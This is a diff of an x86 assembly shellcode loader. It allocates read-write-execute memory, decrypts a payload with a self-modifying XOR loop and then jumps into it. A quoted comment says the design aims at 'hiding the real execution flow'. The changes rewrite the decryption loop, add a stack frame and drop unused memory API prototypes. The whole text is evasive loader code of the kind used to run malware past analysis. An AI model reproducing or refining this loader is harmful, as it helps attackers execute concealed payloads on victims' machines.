@@ -11,8 +11,6 @@ the "jmp shellcode" instruction, ideally hiding the real execution flow.
 .stack 4096
 
 VirtualAlloc proto lpAddress:ptr void, dwSize:ptr void, flAllocationType:dword, flProtect:dword
-VirtualFree proto lpAddress:ptr void, dwSize:ptr void, dwFreeType:dword
-VirtualProtect proto lpAddress:ptr void, dwSize:ptr void, flNewProtect:dword, lpflOldProtect:ptr dword
 
 .code
 
@@ -25,15 +23,15 @@ MEM_COMMIT equ 1000h
 PAGE_EXECUTE_READWRITE equ 40h
 
 @decryption:
-xor word ptr [eax], 06799h ; 0ffe6 (jmp esi) XOR 06681h (first two bytes instruction)
-inc eax
-inc eax
+xor word ptr [eax], 06799h ; <jmp esi bytes> XOR <first two bytes of this instruction>
+add eax, sizeof word
 dec ecx
 loop @decryption
 decryption_size equ $ - @decryption
 
 main proc
-	local mem_addr:dword
+	push ebp
+	mov ebp, esp
 
 	xor edx, edx
 	mov eax, shellcode_size
@@ -70,6 +68,8 @@ main proc
 	mov ecx, shellcode_size + decryption_size	
 	call ebx
 
+	mov esp, ebp
+	pop ebp
 	ret
 main endp
 
